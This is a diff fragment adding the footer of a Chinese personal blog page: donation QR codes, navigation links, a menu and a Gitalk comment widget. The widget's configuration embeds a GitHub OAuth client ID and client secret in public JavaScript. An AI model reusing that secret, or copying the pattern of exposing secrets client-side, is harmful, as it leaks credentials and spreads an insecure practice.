+  </div>
+
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持forsigner</div>
+        <ul>
+        
+          <li class="item">
+            
+              <span>微信扫一扫</span>
+            
+            <img src="/images/qr-wechat.png" alt>
+          </li>
+        
+          <li class="item">
+            
+              <span>支付宝扫一扫</span>
+            
+            <img src="/images/qr-alipay.png" alt>
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2019/04/27/2019全国大学生信息安全竞赛WEB1_Writeuo/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="hide pull-right" href="/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/archives/" rel="noopener noreferrer" target="_self">
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/category/" rel="noopener noreferrer" target="_self">
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/tag/" rel="noopener noreferrer" target="_self">
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/link/" rel="noopener noreferrer" target="_self">
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/about/" rel="noopener noreferrer" target="_self">
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/atom.xml" rel="noopener noreferrer" target="_blank">
+              RSS
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a class="CIRCLE" href="/search/" rel="noopener noreferrer" target="_self">
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+
+<!-- Gitalk评论插件通用代码 -->
+<div id="gitalk-container"></div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+const gitalk = new Gitalk({
+  clientID: '277317290454635afa73',
+  clientSecret: '78223c859304da5e8d71bfce136d436c6ff95c37',
+  repo: 'blog-comment',
+  owner: 'forsigner',
+  // 在这里设置一下截取前50个字符串, 这是因为 github 对 label 的长度有了要求, 如果超过
+  // 50个字符串则会报错.
+  // id: location.pathname.split('/').pop().substring(0, 49),
+  id: location.pathname,
+  admin: ['forsigner'],
+  // facebook-like distraction free mode
+  distractionFreeMode: false
+})
+gitalk.render('gitalk-container')
+</script>
+<!-- Gitalk代码结束 -->
+
+
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
